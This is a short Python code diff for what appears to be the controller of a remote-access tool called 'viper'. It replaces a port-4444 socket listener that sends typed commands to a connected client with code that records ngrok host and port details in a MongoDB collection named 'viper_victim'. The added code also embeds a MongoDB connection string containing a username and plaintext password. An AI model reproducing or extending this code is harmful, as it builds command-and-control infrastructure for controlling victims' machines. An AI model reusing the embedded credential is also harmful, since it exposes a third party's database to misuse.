@@ -1,16 +1,20 @@
-import socket
-from time import sleep
+from pymongo.mongo_client import MongoClient
+from pymongo.server_api import ServerApi
 
-soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
+uri = "mongodb+srv://dhanishkariyatmain:Z1fhLszbWf4dltZ3@dann.ivjbvdg.mongodb.net/?retryWrites=true&w=majority&appName=dann"
 
-soc.bind(("localhost", 4444))
+hostname = input("Enter ngrok host link : ")
+port = input("Enter ngrok port number : ")
 
-soc.listen(10)
+client = MongoClient(uri)
 
-client, addr = soc.accept()
+db = client.viper
 
-while True:
-    print("Sending data")
-    msg = input("> ")
-    client.send(msg.encode())
-    sleep(5)
+post = {
+    "hostname" : hostname,
+    "port" : port
+}
+
+collection = db.viper_victim
+
+collection.insert_one(post)
